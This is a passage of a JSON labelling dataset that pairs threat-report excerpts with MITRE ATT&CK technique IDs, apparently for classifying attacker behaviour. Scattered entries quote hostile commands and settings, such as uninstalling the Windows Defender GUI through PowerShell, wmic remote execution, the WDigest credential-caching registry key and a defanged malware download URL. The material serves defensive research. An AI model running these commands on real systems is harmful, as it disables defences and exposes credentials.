    ]
  },
  {
    "type": "text",
    "text": "can check for the presence of specific files prior to moving to the next phase of execution.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to get users to launch malicious documents to deliver its payload. (Citation: TrendMicro Trickbot Feb 2019)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use encapsulated HTTP/S in C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "the attacker was observed moving laterally to\ndifferent systems in the environment using Remote Desktop Protocol\n(RDP) connections.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "using Windows utilities like ping and tasklist.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "actors used the following commands after exploiting a machine with  malware to obtain information about the OS: ver >> %temp%\\download systeminfo >> %temp%\\download",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can invoke Apple APIs contentsOfDirectoryAtPath pathExtension and (string) compare.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files and tools from its C2 server including through the use of .",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The same code snippets are combined into a second stage JavaScript in “C:\\Users\\<User Name>\\”",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has stored stolen emails and other data into new folders prior to exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can copy files and directories from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can use various API calls to see if it is running in a sandbox.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "sent victims a lure document with a warning that asked victims to enable content for execution.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to add a value to the Registry Run key to establish persistence if it detects it is running with regular user privilege. (Citation: Proofpoint TA505 October 2019)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "will enumerate the macOS version to determine which follow-on behaviors to execute using /usr/bin/sw_vers -productVersion.(Citation: MacKeeper Bundlore Apr 2019)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used WMI to discover network connections and configurations.  has also used the Win32_Process class to execute a malicious DLL.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used malicious e-mail attachments to lure victims into executing malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "uses scheduled tasks typically named Watchmon Service for persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can delete all files created during its execution.(Citation: ESET RTM Feb 2017)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has the capability of sending additional payloads to the hosts",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can collect the user name from the victim's machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "FInally , the newest sample uses dynamic API lookups to attempt to make static disassembly harder to understand.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "terminates antimalware processes.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "gathered information and files from local directories for exfiltration.(Citation: Mandiant Operation Ke3chang November 2014)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can gather a process list from the victim.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate local drives disk type and disk free space.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has lured victims into opening malicious files containing malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors leveraged RDP for access into the account.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has prompted users to enable macros within spearphishing attachments to install malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "HTTPS activity from IP address  to the organization’s VMware server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "established persistence for  by created a scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has collected credentials from infected systems including domain accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "119 readFiles Obtains file information on a file or a folder, and supports a “*” wildcard and recursive file list",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "basic discovery tasks on the host using built in Windows utilities.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to exfiltrate data including Chrome and Edge browser database files from compromised machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "operators were able to access their primary target via RDP connections\nfrom a trusted third party using stolen credentials",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP POST requests for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used batch scripts to delete itself after execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use multiple dynamically resolved API calls.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "powershell.exe Uninstall-WindowsFeature -Name Windows-Defender-GUI",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has manually loaded ntdll from disk in order to identity and remove API hooks set by security products.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor connected into the victim’s environment via a VPN",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors enabled HTTP and HTTPS listeners.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "searches the local system and gathers data.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "the attacker-controlled server through an HTTP POST request",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Several  has conducted word searches on compromised machines to identify specific documents of interest.  malware can use a common function to identify target files by their extension and some also enumerate files and directories including a Destover-like variant that lists files and gathers information for all drives.(Citation: Novetta Blockbuster)(Citation: McAfee GhostSecret)(Citation: ClearSky Lazarus Aug 2020)(Citation: Lazarus APT January 2022)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used the command-line interface.(Citation: FireEye APT37 Feb 2018)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can use the Windows Command Shell for execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has gathered information about network IP configurations using .exe and about routing tables using .exe.(Citation: F-Secure BlackEnergy 2014)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "obtains the IP address location and other relevant network information from the victims machine.(Citation: S2 Grupo TrickBot June 2017)(Citation: Trend Micro Trickbot Nov 2018)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used RDP to access targeted systems.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Following the compromise of this system, analysts identified FIN6 leveraged stolen credentials to move laterally within the environment using the Windows’ Remote Desktop Protocol (RDP).",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "creates a Registry Run key to establish persistence.(Citation: Zscaler Kasidet)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "queries the Registry for specific keys for potential privilege escalation and proxy information.  has also used WMI to query the Windows Registry.(Citation: FireEye FELIXROOT July 2018)",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP and HTTPS for command and control.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can use the Active Directory database to access credentials for users’ accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has commands for adding a remote desktop user and sending RDP traffic to the attacker through a reverse SSH tunnel.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "A noteworthy addition to the Poseidon toolkit is the IGT supertool (Information Gathering toolkit), a bulking 15 megabyte executable that orchestrates a series of different information collections steps, exfiltration, and the cleanup of components",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key.(Citation: Cymmetria Patchwork)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "achieves persistence by making an entry in the Registry's Run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Much like the previous version of Reaver, Reaver.v3 will query the necessary registry keys to determine the correct startup path to use",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "installs itself as a service for persistence.(Citation: Dell Lateral Movement)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate storage volumes and folder contents of a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional payloads and malicious scripts onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has installed  as a service named ControlServiceA in order to establish persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Other tools and scripts were dropped onto one endpoint",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has deleted itself after creating a service as well as deleted a temporary file when the system reboots.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can alter the victim's proxy configuration.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can download updates and auxiliary modules.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "contains a collection of Exfiltration modules that can harvest credentials using .(Citation: GitHub PowerSploit May 2012)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can support RDP control.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Masquerades its command-and-control (C2) traffic as legitimate Google Notifications HTTP requests",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "stores its configuration file within the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The subsequent functions collect additional information such as the machine’s public IP address",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded a remote module for execution.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "wmic  /node:<",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can use .NET API calls in the SharpHound ingestor component to pull Active Directory data.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "the download of wed.hta",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "process listing",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "which is then injected into svchost and dllhost.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The  FilepakMonitor component can inject into the Bka.exe process using the `VirtualAllocEx` `WriteProcessMemory` and `CreateRemoteThread` APIs to load the DLL component.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to gather a list of files and directories on the infected system.(Citation: Securelist ScarCruft May 2019)(Citation: NCCGroup RokRat Nov 2018)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "will look for the current IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can save collected system information to a file named info before exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can launch a remote shell to execute commands.(Citation: ESET InvisiMole June 2018)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "On one machine, we found that the malware injected itself, using process hollowing, into ielowutil.exe",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can load a PE file from memory or the file system and execute it with CreateProcessW.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "to lure victims into downloading a malicious file",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "collected the victim username and whether it was running as admin then sent the information to its C2 server.(Citation: Cymmetria Patchwork)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "establish persistence by creating a registry key under \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run only if the victim’s machine name differs.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has several modules such as `ls.py` `pwd.py` and `recentFiles.py` to enumerate directories and files. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Gets a command to run, executes it",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has deleted files and directories including XML and files successfully uploaded to C2 servers.(Citation: ESET InvisiMole June 2018)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "downloader to the compromised device that executes and downloads the primary payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use the Windows Command Shell to execute commands including its own removal.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used SQL to execute JavaScript and VB scripts on the host system.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "During   relied on a student target to open a malicious document delivered via email.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can use default credentials to connect to IPC$ shares on remote machines.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded and installed web shells to following path C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\IISpool.aspx.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The SQLRat script is designed to make a direct SQL connection to a Microsoft database controlled by the attackers and execute the contents of various tables",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses a driver to scan for specific filesystem driver objects.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has gathered credentials using  and ProcDump.(Citation: CISA AA20-301A Kimsuky)(Citation: Netscout Stolen Pencil Dec 2018)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has used malicious macros to download additional files to the victim's machine. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can stage files in a central location prior to exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Try to disable Tamper Protection settings of Windows Defender",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail browser and instant messaging clients from the Registry.  has searched for given file types.(Citation: F-Secure BlackEnergy 2014)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can identify specific files for exfiltration.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "operators utilize RDP to move laterally in the victim’s environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has collected system information on the infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP to communicate with a command and control server. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download and execute a remote file via .",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Additional information In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers’ arsenal but also some OPSEC mistakes made by the attackers",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can collect information from an air-gapped host machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "is capable of enumerating and making modifications to an infected system's Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Parse all installed application in the compromised host by querying 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall' registry",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has used tools to gather information about users.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Windows\\system32\\cmd.exe /C dir /s *file/",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can collect system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The config file provides download instructions for the loader",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has abused local accounts that have the same password across the victims network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "showing wab.exe executed by WMI",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used the Windows Command Shell and batch scripts for execution on compromised hosts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence by running in the background as an autostart service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "tries to add a Registry Run key under the name Windows Update to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors downloaded additional droppers and backdoors onto a compromised system. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Several  malware families install themselves as new services.(Citation: Novetta Blockbuster)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Both responses instruct the malware to download and load a remote plugin",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used Remote Desktop to log on to servers interactively and manually copy files to remote hosts.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "created a new\nWMI class and added a text property to it in order to store a string\nvalue.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "After decrypting itself in memory  downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This downloaded file is actually not dropped onto the system.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can send a file containing victim system information to C2.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "kills antimalware running process.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute new versions of itself.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Local and external IP address",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor created new O365 Service Principals to maintain access to victim’s environments",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Regular Expressions   ([^r-v\\\\s])[r-v]([\\\\w\\\\d+\\\\/=]+)-\\\\w+.(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\\\s+(([a-fA-F0-9]{0,4}:{1,4}[\\\\w|:]+){1,8})   Address:\\\\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})   ([^r-v\\\\s]+)[r-v]([\\\\w\\\\d+\\\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   (\\\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\\\s+(\\\\d+.\\\\d+.\\\\d+.\\\\d+)    Table 3 Regular expressions used by RogueRobin The C# variant, like its PowerShell relative, will issue DNS queries to determine which query types can successfully communicate with its C2 servers",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to index files from drives user profiles and removable drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "simple stager download of an .exe file and its execution.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The default configuration allows unprivileged users to query group membership of local administrator groups",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "functionalities that collect information about programs and processes,",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can stop anti-virus services on a compromised host.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has relied on victims clicking a malicious document for execution. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The C2 is constructed with the victim's enumerated data",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can identifiy payment card track data on the victim and copy it to a local file in a subdirectory of C:\\Windows\\.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Then it runs the following to attempt to clear file system cache memory:\n%windir%\\system32\\rundll32.exe",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has gathered system architecture processor OS configuration and installed hardware information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The current system username",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "attempted to get users to launch malicious attachments delivered via spearphishing emails.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has deleted the exfiltrated data on disk after transmission.  has also used an instrumentor script to terminate browser processes running on an infected system and then delete the cookie files on disk.(Citation: Securelist Kimsuky Sept 2013)(Citation: Talos Kimsuky Nov 2021)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The account used to perform this lateral movement",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Disables Windows Defender Attack Surface Reduction (ASR) rules",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "gathers the OS version machine name CPU type amount of RAM available and UEFI/BIOS firmware information from the victims machine.(Citation: S2 Grupo TrickBot June 2017)(Citation: Fidelis TrickBot Oct 2016)(Citation: Cyberreason Anchor December 2019)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "injected into multiple processes on different hosts.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download files on an infected host. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collects the OS name machine name and architecture information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has a component to check for running processes to look for web browsers. ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can determine the public IP and location of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "registry run key persistence implementation",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has the curl and wget commands as well as batch scripts to download new tools.(Citation: Intezer TeamTNT September 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The diagram in Figure 1 shows the samples, domains, IP addresses and e-mail addresses that we identified during our investigation (See Appendix B for more detail on these.) There is a clear split between Cluster A and Cluster B, with no infrastructure overlap between the two",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": " \nLoadPackagedLibrary() ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "used WMI to deploy their tools on remote machines and to gather information about the Outlook process.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can communicate over HTTP for C2.(Citation: FireEye APT28)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can perform a recursive directory listing for all volume drives available on the victim's machine and can also fetch specific files by their paths.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Figure 8 shows the network communication of the Pause.ps1 download",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "PHOTO: a DLL backdoor also reported publicly as “Derusbi”, capable of obtaining directory, file, and drive listing; creating a reverse shell; performing screen captures; recording video and audio; listing, terminating, and creating processes; enumerating, starting, and deleting registry keys and values; logging keystrokes, returning usernames and passwords from protected storage; and renaming, deleting, copying, moving, reading, and writing to files",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can collect the victim username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "the team uploaded and executed well-known malicious files",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has included a program ExeProtector which monitors for the existence of  on the infected system and redownloads if necessary.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel.(Citation: cobaltstrike manual)",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has created a scheduled task named Maintenance to establish persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has been executed via malicious e-mail attachments.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "runs its core DLL file using rundll32.exe.(Citation: ESET RTM Feb 2017)",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has been executed via Microsoft Word documents containing malicious macros.(Citation: Cybereason Valak May 2020)(Citation: Unit 42 Valak July 2020)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can execute various Windows commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "gets the username from the system.(Citation: ESET Zebrocy Nov 2018)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "when .NET framework APIs are used in the code",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Some  variants establish persistence by modifying the Registry key HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Run:%appdata%\\NeutralApp\\NeutralApp.exe.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "This file issued a GET request to download a malicious file from: hxxp://94.23.172.164/dupdatechecker.doc",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "collects the victim's username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "malware SierraCharlie uses RDP for propagation.(Citation: Novetta Blockbuster)",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "listed all running processes on the machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can disable Gatekeeper using the native spctl application.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled task XML triggers.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can execute through the WinExec API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded and executed additional plugins.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "modified the WDigest registry key value\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential\nto enable credential caching.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can retrieve system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors relied on victims executing malicious Microsoft Word or PDF files. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
